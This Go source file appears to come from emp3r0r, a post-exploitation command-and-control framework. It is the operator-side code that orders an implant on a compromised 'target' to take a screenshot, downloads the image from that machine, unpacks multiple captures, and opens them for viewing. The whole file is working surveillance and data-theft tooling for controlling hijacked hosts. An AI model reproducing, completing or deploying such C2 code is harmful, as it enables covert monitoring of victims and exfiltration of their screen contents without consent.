package cc

import (
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/agent"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/mholt/archiver"
)

// TakeScreenshot take a screenshot of selected target, and download it
// open the picture if possible
func TakeScreenshot() {
	// tell agent to take screenshot
	err := SendCmdToCurrentTarget("screenshot")
	if err != nil {
		CliPrintError("send screenshot cmd: %v", err)
		return
	}

	// then we handle the cmd output in agentHandler
}

func processScreenshot(out string, target *agent.SystemInfo) (err error) {
	if strings.Contains(out, "Error") {
		return fmt.Errorf(out)
	}
	CliPrintInfo("We will get %s screenshot file for you, wait", strconv.Quote(out))
	err = GetFile(out, target)
	if err != nil {
		err = fmt.Errorf("Get screenshot: %v", err)
		return
	}

	// be sure we have downloaded the file
	for {
		time.Sleep(100 * time.Millisecond)
		if !util.IsFileExist(FileGetDir+out+".emp3r0r") &&
			util.IsFileExist(FileGetDir+out) {
			break
		}
	}

	// unzip if it's zip
	if strings.HasSuffix(out, ".zip") {
		err = archiver.Unarchive(FileGetDir+out, FileGetDir)
		if err != nil {
			return fmt.Errorf("Unarchive screenshot zip: %v", err)
		}
		CliPrintWarning("Multiple screenshots extracted to %s", FileGetDir)
		return
	}

	// open it if possible
	if util.IsCommandExist("xdg-open") &&
		os.Getenv("DISPLAY") != "" {
		CliPrintSuccess("Seems like we can open the picture for you to view, hold on")
		cmd := exec.Command("xdg-open", FileGetDir+out)
		err = cmd.Start()
		if err != nil {
			return fmt.Errorf("Crap, we cannot open the picture: %v", err)
		}
	}

	return
}
